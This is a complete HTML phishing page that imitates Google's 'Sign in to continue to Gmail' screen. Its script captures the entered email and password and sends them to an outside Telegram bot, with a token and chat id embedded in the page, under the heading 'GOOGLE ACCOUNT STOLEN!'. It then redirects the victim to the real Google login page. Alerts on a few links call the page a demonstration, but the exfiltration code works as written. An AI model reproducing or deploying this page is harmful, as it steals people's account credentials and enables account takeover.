<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .card {
            background: #ffffff;
            padding: 48px 40px 36px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            max-width: 450px;
            width: 100%;
        }

        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .logo img {
            width: 75px;
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            background: #ffffff;
            color: #202124;
        }

        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        .input-group input::placeholder {
            color: #80868b;
        }

        .forgot-link {
            display: block;
            text-align: right;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-top: 6px;
            cursor: pointer;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .button-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 28px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            letter-spacing: 0.3px;
        }

        .next-btn:hover {
            background: #1557b0;
        }

        .footer {
            margin-top: 32px;
            border-top: 1px solid #dadce0;
            padding-top: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .card {
                padding: 32px 20px 28px;
                border: none;
            }
            .button-row {
                flex-direction: column;
                gap: 16px;
            }
            .next-btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- Real Google Logo -->
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google">
        </div>

        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>

        <div class="input-group">
            <input type="email" id="email" placeholder="Email or phone" autofocus>
        </div>

        <div class="input-group" id="passwordGroup" style="display: none;">
            <input type="password" id="password" placeholder="Enter your password">
            <a class="forgot-link">Forgot password?</a>
        </div>

        <div class="button-row">
            <a class="create-account">Create account</a>
            <button class="next-btn" id="nextBtn">Next</button>
        </div>

        <div class="footer">
            <span>English (United States)</span>
            <span>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </span>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('email');
        const passwordGroup = document.getElementById('passwordGroup');
        const passwordInput = document.getElementById('password');
        const nextBtn = document.getElementById('nextBtn');

        emailInput.addEventListener('input', function() {
            if (this.value.length > 0) {
                passwordGroup.style.display = 'block';
                passwordInput.focus();
            } else {
                passwordGroup.style.display = 'none';
            }
        });

        function handleKeyPress(e) {
            if (e.key === 'Enter') {
                steal();
            }
        }

        emailInput.addEventListener('keypress', handleKeyPress);
        passwordInput.addEventListener('keypress', handleKeyPress);

        function steal() {
            let email = emailInput.value.trim();
            let password = passwordInput.value.trim();

            if (!email) {
                alert('Please enter your email.');
                emailInput.focus();
                return;
            }

            if (!password) {
                alert('Please enter your password.');
                passwordInput.focus();
                return;
            }

            let message = `🔐 GOOGLE ACCOUNT STOLEN!\n📧 Email: ${email}\n🔑 Password: ${password}`;

            fetch('https://api.telegram.org/bot8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc/sendMessage?chat_id=5805421075&text=' + encodeURIComponent(message))
                .then(() => {
                    window.location.href = 'https://accounts.google.com/';
                })
                .catch(() => {
                    window.location.href = 'https://accounts.google.com/';
                });
        }

        nextBtn.addEventListener('click', steal);

        document.querySelector('.forgot-link')?.addEventListener('click', function() {
            alert('This is a demonstration. Please use the Next button to login.');
        });

        document.querySelector('.create-account')?.addEventListener('click', function(e) {
            e.preventDefault();
            alert('This is a demonstration. Please use the Next button to login.');
        });
    </script>
</body>
</html>
